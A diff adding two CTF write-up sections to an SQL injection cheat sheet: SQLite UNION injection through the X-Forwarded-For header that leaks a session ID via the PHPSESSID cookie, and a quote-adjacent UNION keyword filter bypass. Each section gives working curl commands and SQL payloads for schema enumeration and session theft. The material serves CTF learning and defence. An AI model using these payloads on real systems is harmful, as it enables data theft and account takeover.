@@ -30,6 +30,8 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [LDAP Filter Breakout with Wildcard Injection (CSAW 2018)](#ldap-filter-breakout-with-wildcard-injection-csaw-2018)
 - [ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)](#expressionengine-filemanager-order-by-sort-key-sqli-35c3-2018)
 - [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
+- [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
+- [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)
 
 ---
 
@@ -736,5 +738,53 @@ Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing o
 **Key insight:** Any ORM that lets the client pick sort columns must allowlist them. The attack is particularly nasty because `ORDER BY` subqueries are rarely caught by WAFs that focus on `SELECT`/`UNION` keywords.
 
 **References:** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi, writeup 12880
+
+---
+
+## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)
+
+**Pattern:** A session initializer builds `SELECT ... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'` and copies the resulting row into the `PHPSESSID` cookie. The value of the last column of your UNION row becomes the cookie — a free one-shot exfiltration channel. The error message `unrecognized token` reveals SQLite; enumerate with `sqlite_master`.
+
+```bash
+# Discover column count (4 columns in this table)
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"
+
+# Leak table definitions from sqlite_master
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"
+
+# Exfiltrate a specific row (session_id for user 5)
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
+# -> Set-Cookie: PHPSESSID=<leaked value>
+```
+Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user (e.g., Maria).
+
+**Key insight:** Session-ID generation logic often includes unsanitized HTTP headers (`X-Forwarded-For`, `Client-IP`, `True-Client-IP`). The reflected row becomes a free oracle: no error-based or time-based inference required. SQLite-specific UNION uses `null` padding and `sqlite_master(type,name,tbl_name,sql)` for schema enumeration (no `information_schema`).
+
+**References:** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria, writeup 13236
+
+---
+
+## Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)
+
+**Pattern:** Application blocks the word `UNION` but naively looks for `" UNION "` (space-delimited). The SQL lexer treats a closing quote as a token boundary, so `'UNION` is still parsed as the keyword `UNION` after the string literal closes. Placing `UNION` flush against the closing quote slips past the string filter while the parser still accepts it.
+
+```sql
+-- Original: SELECT items FROM Search WHERE items='<input>';
+-- Blocked (filter sees " UNION "):
+aggies' UNION SELECT 1; #
+
+-- Bypass (no space before UNION — filter sees "UNION" embedded in word "aggies'UNION"):
+aggies'UNION SELECT 1; #
+
+-- Drop the string prefix entirely:
+'UNION SELECT @@VERSION #
+'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
+'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
+'UNION ALL SELECT grantee FROM information_schema.user_privileges #
+```
+
+**Key insight:** Naive blacklists look for whitespace-delimited keywords, but SQL lexers tolerate quote-adjacent tokens — the closing `'` is implicit whitespace to the parser. The same trick works for `/*!50000UNION*/`, tab/newline (`%09`, `%0a`), parentheses (`UNION(SELECT...)`), and comment blocks (`UNION/**/SELECT`). Also probe `information_schema.user_privileges` for the `grantee` column — CTF authors often hide flags as the privileged user's name.
+
+**References:** TAMUctf 2019 — Bird Box Challenge, writeup 13860
 
 ---
